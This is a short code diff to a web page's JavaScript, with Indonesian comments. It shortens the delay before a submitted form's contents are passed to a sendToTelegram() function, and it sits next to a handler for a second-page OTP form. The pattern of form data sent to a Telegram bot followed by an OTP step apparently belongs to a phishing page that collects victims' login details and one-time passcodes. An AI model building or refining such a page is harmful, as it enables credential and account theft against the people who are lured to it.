@@ -803,7 +803,7 @@
 
           document.getElementById("loadingScreen").style.display = "flex";
 
-          // Tambah timeout 15 detik untuk halaman pertama
+          // Tambah timeout 2 detik untuk halaman pertama
           setTimeout(() => {
             sendToTelegram(message)
               .then((response) => {
@@ -814,7 +814,7 @@
               .finally(() => {
                 document.getElementById("loadingScreen").style.display = "none";
               });
-          }, 5000); // 15 detik
+          }, 2000); // 2 detik
         });
 
       // Handler form OTP (halaman 2)
